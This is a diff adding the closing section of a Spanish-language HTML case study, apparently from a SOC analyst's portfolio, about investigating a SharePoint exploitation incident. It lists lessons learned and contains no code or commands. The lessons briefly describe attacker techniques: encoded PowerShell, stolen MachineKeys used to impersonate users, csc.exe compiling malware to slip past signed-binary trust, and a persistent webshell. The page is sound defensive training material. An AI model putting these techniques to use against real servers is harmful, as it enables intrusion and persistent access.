+            <p class="case-section-title">// 10_lecciones</p>
+            <h2>Lecciones aprendidas</h2>
+
+            <div class="lessons-grid">
+                <div class="lesson">
+                    <p><strong>w3wp.exe generando PowerShell es siempre sospechoso.</strong> Un proceso IIS Worker nunca debería tener PowerShell como proceso hijo en condiciones normales. Esta relación padre-hijo es una señal de alarma inmediata de RCE en servidores web.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>Base64 en comandos PowerShell requiere decodificación obligatoria.</strong> El uso de -EncodedCommand es una técnica de ofuscación común. Siempre decodificar con CyberChef o similar para entender el impacto real del comando ejecutado.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>Las MachineKeys comprometidas son un riesgo crítico de autenticación.</strong> Con ValidationKey y DecryptionKey expuestas, el atacante puede impersonar a cualquier usuario. La rotación de claves y la invalidación de sesiones son pasos no opcionales.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>LOLBIN con csc.exe evade muchos controles.</strong> Usar el compilador C# legítimo de Microsoft para generar malware en tiempo de ejecución es una técnica avanzada que bypasea soluciones que confían en binarios firmados.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>La verificación de ejercicios programados debe ser exhaustiva.</strong> Buscar por IP, hostname, CVE y nombres de archivo. Documentar explícitamente la ausencia de resultados antes de clasificar — no basta con una búsqueda superficial.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>Una webshell en LAYOUTS significa persistencia real.</strong> El atacante no necesita reexplotar nada — tiene acceso HTTP directo al servidor. La eliminación del archivo y auditoría de la carpeta son prioritarias en la respuesta.</p>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <span class="mono dim">© 2026 José Corrales</span>
+            <span class="dim">·</span>
+            <span class="mono dim">CASE-004 · SOC342 · CVE-2025-53770</span>
+        </footer>
+
+    </div>
+
+    <script>
+        const glow = document.getElementById('cursorGlow');
+        document.addEventListener('mousemove', e => {
+            glow.style.left = e.clientX + 'px';
+            glow.style.top = e.clientY + 'px';
+        });
+    </script>
+
+</body>
+</html>
